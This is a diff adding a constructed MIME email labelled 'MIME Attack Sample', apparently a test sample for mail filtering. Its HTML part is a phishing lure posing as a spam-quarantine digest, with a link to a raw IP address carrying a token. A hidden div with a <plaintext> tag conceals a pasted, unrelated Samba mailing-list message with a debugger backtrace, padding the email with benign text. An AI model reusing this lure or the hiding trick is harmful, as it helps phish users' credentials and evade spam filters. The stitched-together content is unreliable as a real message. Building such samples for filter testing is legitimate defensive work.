@@ -1,0 +1,110 @@
+From: s.day.-return-11-5-11775115-c0mgrdylu6uc1jlt-322@mta11.optamail.com
+To: david.port@enron.com, vladimir.gorny@enron.com, s..bradford@enron.com, 
+Subject: MIME Attack Sample
+Content-Type: multipart/mixed; boundary="BOUNDARY"
+--BOUNDARY
+Content-Type: text/html
+Content-Type: text/html; charset=us-ascii
+Content-Transfer-Encoding: 7bit
+X-Mailer: UVM MailSender
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 133
+
+
+<html>
+  <head>
+    <title>Quarantine Digest for jose@monkey.org</title>
+  </head>
+
+  <body>
+
+  <h3>Quarantine Digest for jose@monkey.org</h3>
+
+  <a href="https://112.199.74.30:4343/quarantine/manageuser?tkn=ZW1tYZSrHlereRfWJJ2bqX%2F3mpCa%2FKFYrwdGyQ%3D%3D">Click here to access your spam quarantine.</a>
+  <br/>
+  The spam quarantine contains emails that are being held from your email account.
+  <br/>
+  Quarantined emails can be released to your inbox or deleted using the spam quarantine link.
+  
+  </body>
+</html>
+
+<style>fieldset, br{display: none;}</style>
+<div style="display: none;"><plaintext>
+--BOUNDARY
+Content-Type: text/plain
+-BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+Stefan (metze) Metzmacher schrieb:
+> Stefan (metze) Metzmacher schrieb:
+>> Stefan (metze) Metzmacher schrieb:
+>>> Hi,
+>>> I just noticed this while manually run make test in samba3
+>>> on host hape HP-UX 11.00. Maybe the build-farm will show this
+>>> also in the next run...
+>> strange that BASE-LOCK-LOCK3 from samba4 smbtorture doesn't trigger this...
+> 
+>> a backtrace with smbd/*.o locking/*.o lib/talloc/*.o and lib/fault.o
+>> lib/util.o compiled with -g1:
+> 
+>> I'll try with -g now:
+> 
+> here it is using -ggdb3
+> 
+> warning: reading `r3' register: No data
+> 0xc01f5b78 in _waitpid_sys+0x10 () from /usr/lib/libc.2
+> #0  0xc01f5b78 in _waitpid_sys+0x10 () from /usr/lib/libc.2
+> No symbol table info available.
+> #1  0xc0202d04 in waitpid+0x64 () from /usr/lib/libc.2
+> No symbol table info available.
+> #2  0xc01ec760 in _system_sys+0x1b0 () from /usr/lib/libc.2
+> No symbol table info available.
+> #3  0xc0202714 in system+0x5c () from /usr/lib/libc.2
+> No symbol table info available.
+> #4  0x3fa5d4 in smb_panic (why=<incomplete type>) at lib/util.c:1658
+>         cmd = 0x40164ac8
+> "/home/build/build_farm/samba_3_0.metze/source/script/tests/../../script/tests/gdb_backtrace
+> 3768 /
+> home/build/build_farm/samba_3_0.metze/source/bin/smbd"
+>         result = 1696625253
+> #5  0x374ecc in byte_range_lock_destructor (br_lck=0x40164868) at
+> locking/brlock.c:1578
+>         data = {dptr = 0x401b90c8 "", dsize = 8832}
+>         status = {v = 3221225473}
+>         key = {dptr = 0x40164878 "", dsize = 16}
+> #6  0x3c862c in _talloc_free (ptr=0x40164868) at lib/talloc/talloc.c:0
+> No locals.
+> #7  0x3c9630 in talloc_free (ptr=0x40164868) at lib/talloc/talloc.c:0
+
+this is not a crash it's smb_panic() in action:-)
+and status == NT_STATUS_UNSUCCESSFUL == NT_STATUS(0xC0000000 | 0x0001)
+== 3221225473
+
+        } else {
+                TDB_DATA data;
+                NTSTATUS status;
+
+                data.dptr = (uint8 *)br_lck->lock_data;
+                data.dsize = br_lck->num_locks * sizeof(struct lock_struct);
+
+                status = br_lck->record->store(br_lck->record, data,
+                                               TDB_REPLACE);
+                if (!NT_STATUS_IS_OK(status)) {
+                        DEBUG(0, ("store returned %s\n",
+nt_errstr(status)));
+                        smb_panic("Could not store byte range mode
+entry\n");
+                }
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.5 (GNU/Linux)
+Comment: Using GnuPG with SUSE - http://enigmail.mozdev.org
+
+iD8DBQFGZVUsm70gjA5TCD8RAqFaAJ9yMg40noDGxUlTUVUqXJ7xx9k+ggCfXyk4
+/+8ipHEwMUA1KUcHFg+kaWE=
+=aB9E
+-----END PGP SIGNATURE-----
+
+-BOUNDARY--
